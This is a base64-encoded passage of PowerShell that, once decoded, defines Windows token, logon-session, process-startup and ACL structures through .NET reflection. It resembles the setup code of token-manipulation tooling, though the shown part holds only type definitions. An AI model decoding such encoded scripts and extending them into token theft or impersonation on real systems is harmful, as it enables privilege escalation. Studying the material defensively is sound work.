VG9rZW5UeXBlJywgW1VJbnQzMl0gOCkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuSW1wZXJzb25hdGlvbkxldmVsJywgW1VJbnQzMl0gOSkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuU3RhdGlzdGljcycsIFtVSW50MzJdIDEwKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5SZXN0cmljdGVkU2lkcycsIFtVSW50MzJdIDExKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5TZXNzaW9uSWQnLCBbVUludDMyXSAxMikgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuR3JvdXBzQW5kUHJpdmlsZWdlcycsIFtVSW50MzJdIDEzKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5TZXNzaW9uUmVmZXJlbmNlJywgW1VJbnQzMl0gMTQpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlblNhbmRCb3hJbmVydCcsIFtVSW50MzJdIDE1KSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5BdWRpdFBvbGljeScsIFtVSW50MzJdIDE2KSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5PcmlnaW4nLCBbVUludDMyXSAxNykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuRWxldmF0aW9uVHlwZScsIFtVSW50MzJdIDE4KSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5MaW5rZWRUb2tlbicsIFtVSW50MzJdIDE5KSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5FbGV2YXRpb24nLCBbVUludDMyXSAyMCkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuSGFzUmVzdHJpY3Rpb25zJywgW1VJbnQzMl0gMjEpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlbkFjY2Vzc0luZm9ybWF0aW9uJywgW1VJbnQzMl0gMjIpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlblZpcnR1YWxpemF0aW9uQWxsb3dlZCcsIFtVSW50MzJdIDIzKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5WaXJ0dWFsaXphdGlvbkVuYWJsZWQnLCBbVUludDMyXSAyNCkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuSW50ZWdyaXR5TGV2ZWwnLCBbVUludDMyXSAyNSkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuVUlBY2Nlc3MnLCBbVUludDMyXSAyNikgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuTWFuZGF0b3J5UG9saWN5JywgW1VJbnQzMl0gMjcpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlbkxvZ29uU2lkJywgW1VJbnQzMl0gMjgpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlbklzQXBwQ29udGFpbmVyJywgW1VJbnQzMl0gMjkpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlbkNhcGFiaWxpdGllcycsIFtVSW50MzJdIDMwKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5BcHBDb250YWluZXJTaWQnLCBbVUludDMyXSAzMSkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuQXBwQ29udGFpbmVyTnVtYmVyJywgW1VJbnQzMl0gMzIpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlblVzZXJDbGFpbUF0dHJpYnV0ZXMnLCBbVUludDMyXSAzMykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuRGV2aWNlQ2xhaW1BdHRyaWJ1dGVzJywgW1VJbnQzMl0gMzQpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlblJlc3RyaWN0ZWRVc2VyQ2xhaW1BdHRyaWJ1dGVzJywgW1VJbnQzMl0gMzUpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlblJlc3RyaWN0ZWREZXZpY2VDbGFpbUF0dHJpYnV0ZXMnLCBbVUludDMyXSAzNikgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuRGV2aWNlR3JvdXBzJywgW1VJbnQzMl0gMzcpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlblJlc3RyaWN0ZWREZXZpY2VHcm91cHMnLCBbVUludDMyXSAzOCkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuU2VjdXJpdHlBdHRyaWJ1dGVzJywgW1VJbnQzMl0gMzkpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlbklzUmVzdHJpY3RlZCcsIFtVSW50MzJdIDQwKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnTWF4VG9rZW5JbmZvQ2xhc3MnLCBbVUludDMyXSA0MSkgfCBPdXQtTnVsbAoJJFRPS0VOX0lORk9STUFUSU9OX0NMQVNTID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoKICAgICNTVFJVQ1RzCiAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTEFSR0VfSU5URUdFUicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvd1BhcnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSGlnaFBhcnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRMQVJHRV9JTlRFR0VSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoKICAgICNTdHJ1Y3QgTFVJRAogICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0xVSUQnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA4KQoJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb3dQYXJ0JywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0hpZ2hQYXJ0JywgW0ludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRMVUlEID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoKICAgICNTdHJ1Y3QgVE9LRU5fU1RBVElTVElDUwogICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ1RPS0VOX1NUQVRJU1RJQ1MnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdKQoJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUb2tlbklkJywgJExVSUQsICdQdWJsaWMnKSB8IE91dC1OdWxsCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0F1dGhlbnRpY2F0aW9uSWQnLCAkTFVJRCwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhwaXJhdGlvblRpbWUnLCAkTEFSR0VfSU5URUdFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVG9rZW5UeXBlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltcGVyc29uYXRpb25MZXZlbCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEeW5hbWljQ2hhcmdlZCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEeW5hbWljQXZhaWxhYmxlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0dyb3VwQ291bnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUHJpdmlsZWdlQ291bnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTW9kaWZpZWRJZCcsICRMVUlELCAnUHVibGljJykgfCBPdXQtTnVsbAoJJFRPS0VOX1NUQVRJU1RJQ1MgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBMU0FfVU5JQ09ERV9TVFJJTkcKICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdMU0FfVU5JQ09ERV9TVFJJTkcnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdKQoJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMZW5ndGgnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWF4aW11bUxlbmd0aCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCdWZmZXInLCBbSW50UHRyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRMU0FfVU5JQ09ERV9TVFJJTkcgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBMU0FfTEFTVF9JTlRFUl9MT0dPTl9JTkZPCiAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTFNBX0xBU1RfSU5URVJfTE9HT05fSU5GTycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0pCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xhc3RTdWNjZXNzZnVsTG9nb24nLCAkTEFSR0VfSU5URUdFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTGFzdEZhaWxlZExvZ29uJywgJExBUkdFX0lOVEVHRVIsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZhaWxlZEF0dGVtcHRDb3VudFNpbmNlTGFzdFN1Y2Nlc3NmdWxMb2dvbicsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJJExTQV9MQVNUX0lOVEVSX0xPR09OX0lORk8gPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBTRUNVUklUWV9MT0dPTl9TRVNTSU9OX0RBVEEKICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdTRUNVUklUWV9MT0dPTl9TRVNTSU9OX0RBVEEnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdKQoJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvZ2luSUQnLCAkTFVJRCwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVXNlcm5hbWUnLCAkTFNBX1VOSUNPREVfU1RSSU5HLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2dpbkRvbWFpbicsICRMU0FfVU5JQ09ERV9TVFJJTkcsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0F1dGhlbnRpY2F0aW9uUGFja2FnZScsICRMU0FfVU5JQ09ERV9TVFJJTkcsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvZ29uVHlwZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTZXNzaW9uJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpZCcsIFtJbnRQdHJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2dpblRpbWUnLCAkTEFSR0VfSU5URUdFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9naW5TZXJ2ZXInLCAkTFNBX1VOSUNPREVfU1RSSU5HLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEbnNEb21haW5OYW1lJywgJExTQV9VTklDT0RFX1NUUklORywgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVXBuJywgJExTQV9VTklDT0RFX1NUUklORywgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVXNlckZsYWdzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xhc3RMb2dvbkluZm8nLCAkTFNBX0xBU1RfSU5URVJfTE9HT05fSU5GTywgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9nb25TY3JpcHQnLCAkTFNBX1VOSUNPREVfU1RSSU5HLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQcm9maWxlUGF0aCcsICRMU0FfVU5JQ09ERV9TVFJJTkcsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0hvbWVEaXJlY3RvcnknLCAkTFNBX1VOSUNPREVfU1RSSU5HLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdIb21lRGlyZWN0b3J5RHJpdmUnLCAkTFNBX1VOSUNPREVfU1RSSU5HLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2dvZmZUaW1lJywgJExBUkdFX0lOVEVHRVIsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0tpY2tPZmZUaW1lJywgJExBUkdFX0lOVEVHRVIsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Bhc3N3b3JkTGFzdFNldCcsICRMQVJHRV9JTlRFR0VSLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQYXNzd29yZENhbkNoYW5nZScsICRMQVJHRV9JTlRFR0VSLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQYXNzd29yZE11c3RDaGFuZ2UnLCAkTEFSR0VfSU5URUdFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRTRUNVUklUWV9MT0dPTl9TRVNTSU9OX0RBVEEgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBTVEFSVFVQSU5GTwogICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ1NUQVJUVVBJTkZPJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSkKCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnY2InLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnbHBSZXNlcnZlZCcsIFtJbnRQdHJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdscERlc2t0b3AnLCBbSW50UHRyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnbHBUaXRsZScsIFtJbnRQdHJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdkd1gnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZHdZJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2R3WFNpemUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZHdZU2l6ZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdkd1hDb3VudENoYXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2R3WUNvdW50Q2hhcnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZHdGaWxsQXR0cmlidXRlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2R3RmxhZ3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnd1Nob3dXaW5kb3cnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnY2JSZXNlcnZlZDInLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnbHBSZXNlcnZlZDInLCBbSW50UHRyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnaFN0ZElucHV0JywgW0ludFB0cl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2hTdGRPdXRwdXQnLCBbSW50UHRyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnaFN0ZEVycm9yJywgW0ludFB0cl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkkU1RBUlRVUElORk8gPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnUFJPQ0VTU19JTkZPUk1BVElPTicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0pCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2hQcm9jZXNzJywgW0ludFB0cl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2hUaHJlYWQnLCBbSW50UHRyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZHdQcm9jZXNzSWQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZHdUaHJlYWRJZCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJJFBST0NFU1NfSU5GT1JNQVRJT04gPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBUT0tFTl9FTEVWQVRJT04KICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdUT0tFTl9FTEVWQVRJT04nLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdKQoJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUb2tlbklzRWxldmF0ZWQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCSRUT0tFTl9FTEVWQVRJT04gPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgI1N0cnVjdCBMVUlEX0FORF9BVFRSSUJVVEVTCiAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTFVJRF9BTkRfQVRUUklCVVRFUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDEyKQogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMdWlkJywgJExVSUQsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0F0dHJpYnV0ZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRMVUlEX0FORF9BVFRSSUJVVEVTID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCQogICAgI1N0cnVjdCBUT0tFTl9QUklWSUxFR0VTCiAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnVE9LRU5fUFJJVklMRUdFUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDE2KQogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQcml2aWxlZ2VDb3VudCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQcml2aWxlZ2VzJywgJExVSURfQU5EX0FUVFJJQlVURVMsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVE9LRU5fUFJJVklMRUdFUyA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCiAgICAjU3RydWN0IEFDRV9IRUFERVIKICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdBQ0VfSEVBREVSJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSkKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWNlVHlwZScsIFtCeXRlXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWNlRmxhZ3MnLCBbQnl0ZV0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FjZVNpemUnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICRBQ0VfSEVBREVSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoKICAgICNTdHJ1Y3QgQUNMCiAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnQUNMJywgJEF0dHJpYnV0ZXMsIFtTeX